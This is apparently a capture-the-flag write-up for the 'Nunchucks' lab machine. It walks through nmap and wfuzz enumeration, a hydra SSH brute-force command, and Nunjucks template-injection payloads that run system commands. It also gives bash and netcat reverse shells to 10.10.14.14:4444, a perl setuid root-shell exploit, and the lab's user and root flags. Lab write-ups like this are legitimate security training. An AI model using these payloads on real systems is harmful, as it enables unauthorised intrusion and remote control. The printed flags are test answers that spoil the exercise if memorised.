# Enumeration
## Nmap
Started of with a simple nmap scan which showed:
_PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel_
A UDP portscan showed:
_5353/udp open|filtered zeroconf_
this article seemed potentially helpful (https://book.hacktricks.xyz/pentesting/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks)
## Directory / Subdomain Discovery
`wfuzz -H "Host: FUZZ.nunchucks.htb" -w tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt https://nunchucks.htb`
I quickly realised that there was something interesting going on, most likely connected to the _zeroconf_ UDP service. After osme help, it appeared using the filter `--hh 30587` filtered out all of the non-useful ones.
Result was the usbdomain _store_. So Iproceeded to add this to /etc/hosts and moved on.
## Other
`hydra -l admin -P tools/SecLists/Passwords/2020-200_most_used_passwords.txt ssh://10.10.11.122:22 -v`

`searchsploit nginx `

## Burp
Submitting the email 'application' form on store.nunchucks.htb, shows a POST request with a field in curly brackets (see store.nunchucks_email_post) --> indicating json format. Inspecting the HTML after submitting the request shows that it is stored in the HTML on the website, but the submitted JS was not executed.

Sending the request to the repeater I followed the (https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#nunjucks) article and initially tried the following sequence `"email":"${{<%[%'"}}%\"`. This returned an error, which meant SSTI is most likely possible. Next I therefore tried `"email":"{{7*7}}"` which returned 49. 
I proceeded to the Nunjucks part of the article and tried the first payload they had there `{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}` but this simply returned an error in the repeater. Replacing the " with ' simply showed a _502 bad gateway_ error. 

Looking further (http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine) I found that escaping the double quotes is possible by using backslashes. So I proceeded to use the following payload `"email":"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')\")()}}"` and it worked.

Looking at it this, it appears there is an MySQL server running. I am certain if we can get a shell up and running that we will be able to get something out of this server.


#######################


# Exploit
## Finding Vulnerability - SSTI
Proceeding trying to get a shell, I use the code `{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.14.14/4444 0>&1\"')\")()}}`, and set up a nc listener. Sending this through burp with the escape characters did not work...
Trying a different reverse shell code from (https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
`{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 4444 >/tmp/f')\")()}}` abd we got a shell!

## Enumeration 2
- user = _David_
- directory = _/var/www/store.nunchucks_. User flag was found by cd and then reading it. 
- system info = _$ uname -a
Linux nunchucks 5.4.0-86-generic #97-Ubuntu SMP Fri Sep 17 19:19:40 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux_
Looking around I thoought a potential abuse could be mysql, but I wanted to check for other things too.
I decided to run linpeas, as the mysql had a tag _nonexistent_.
### Enum Results
- Vulnerable to CVE-2021-4034  
- cron jobs: -rwxr-xr-x   1 root root   813 Feb 25  2020 man-db, popularity-contest, update-notifier-common
- sockets
- useful software = /usr/bin/perl
- MySQL (root/toor, root/root, root/NOPASS)
- cat /etc/pam.d/passwd
- SGID -rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
- backups in /opt: /opt/web_backups/backup_2021-09-26-1632618416.tar
---> these are both group writeable

Looking in the /opt directory it appreas there is a pearl file which creates backus of the website to the web_backups directory. It has root as owner but David can execute it. This will be a simple SUID exploit.
This part of the code was particularly interesting:
`POSIX::setuid(0);`
**(This)[https://gtfobins.github.io/gtfobins/perl/]** is quite good for the privesc and we will be using `/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'` . But it appears a shell cannot be created (as seen from error message at beggingin /bin/bash did not work). Commands such as `whoami` can however still be executed. After looking for some help, AppArmor `/etc/apparmor.d` appears to be containing some information 

#######################


# Privilege Escalation
SUID bit set to perl POSIX --> a perl script ran as root which runs backups of the web server that David has access to.
AppArmor bug (https://bugs.launchpad.net/apparmor/+bug/1911431) will be exploited.
## Exploit
`$ echo "#!/usr/bin/perl" > pwn.pl`
`$ echo "use POSIX qw(setuid);" >> pwn.pl`
`$ echo "POSIX::setuid(0);" >> pwn.pl`
`$ echo 'exec "/bin/bash";' >> pwn.pl`

#######################


# User Flag
53b4cdecc09c6e78dcffd3fa5ef24dd4
# System Flag
95f73b012b1a8d2894df2f164409df20

# thoughts
_csrf token --> 
nunjucks
responder?
sudo /usr/share/responder/Responder.py -I tun0 -Pv
# new things learnt
 - wfuzz
 - autorecon (needs downloading/cloning from github)
 - AppArmor
 - Shebang